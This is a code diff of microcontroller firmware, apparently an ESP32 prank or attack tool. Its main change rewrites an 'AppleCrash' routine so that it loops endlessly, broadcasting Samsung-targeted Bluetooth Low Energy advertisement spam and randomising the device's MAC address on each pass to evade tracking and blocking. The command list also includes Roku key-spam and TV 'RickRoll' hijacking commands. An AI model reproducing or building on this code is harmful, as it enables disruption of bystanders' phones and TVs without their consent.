@@ -30,7 +30,7 @@ flipperLED led;
 
 #ifdef SUPPORTS_BLE
 #include <NimBLEDevice.h>
-NimBLEAdvertising *pAdvertising;
+NimBLEAdvertising* pAdvertising;
 #include "BLEPackets.h"
 #endif
 
@@ -99,19 +99,30 @@ void RokuKeySpam(const char* SSID, const char* Password) {
 void AppleCrash(const char* UnusedParameter) {
 #ifdef SUPPORTS_BLE
 
-  NimBLEDevice::init("");
-  NimBLEServer *pServer = NimBLEDevice::createServer();
-  pAdvertising = pServer->getAdvertising();
-
   while (true) {
-    NimBLEAdvertisementData advertisementData = getOAdvertisementData();
-    pAdvertising->setAdvertisementData(advertisementData);
+    NimBLEDevice::init("");
+    NimBLEServer* pServer = NimBLEDevice::createServer();
+    pAdvertising = pServer->getAdvertising();
+
+
+    SamsungTestBLEData advertisementData = GetSamsungTestBLE();
+    pAdvertising->setAdvertisementData(advertisementData.advertisementData);
+    pAdvertising->setScanResponseData(advertisementData.scanResponse);
+
+
     pAdvertising->start();
     Serial.println("Sending Packet");
-    delay(20);
-    pAdvertising->stop();
-  }
+    delay(100);
+    NimBLEDevice::deinit();
 
+    uint8_t mac[6];
+    for (int i = 0; i < 6; i++) {
+      mac[i] = random(0, 256);
+    }
+    mac[0] = (mac[0] & 0xFC) | 0x02;
+
+    esp_base_mac_addr_set(mac);
+  }
 #endif
 }
 
@@ -217,7 +228,7 @@ Command<const char*, const char*, const char*> cmd1("YTVConnect", "Connect to Yo
 Command<const char*, const char*> cmd2("RickRollTV", "Rickroll a TV. Usage: RickRollTV <SSID> <Password>", RickRollTV);
 Command<const char*, const char*, const char*> cmd3("ChromeConnectEZYT", "Connect to Youtube Easily Usage: YTChromeConnectEasy <SSID> <Password> <ID>", YTChromeConnectEasy);
 const int numCommands = 9;
-CommandBase* commands[MAX_COMMANDS] = { &cmd1, &cmd2, &cmd3, &cmd4, &cmd5, &cmd6, &cmd7, &cmd8, &cmd9};
+CommandBase* commands[MAX_COMMANDS] = { &cmd1, &cmd2, &cmd3, &cmd4, &cmd5, &cmd6, &cmd7, &cmd8, &cmd9 };
 CommandLine commandli(commands, numCommands);
 
 void loop() {
@@ -229,9 +240,9 @@ void LoopTask(void* parameter) {
   while (true) {
     if (ShouldMultithread) {
       Portal.loop(commandli);
-      #ifdef NEOPIXEL
+#ifdef NEOPIXEL
       led.main(millis());
-      #endif
+#endif
     }
     vTaskDelay(1000 / portTICK_PERIOD_MS);  // Run every second
   }
@@ -257,7 +268,7 @@ void setup() {
 #endif
 
 #ifdef NEOPIXEL
-led.RunSetup();
+  led.RunSetup();
 #endif
 
   xTaskCreatePinnedToCore(LoopTask, "LoopTask", 20000, NULL, 1, NULL, 1);
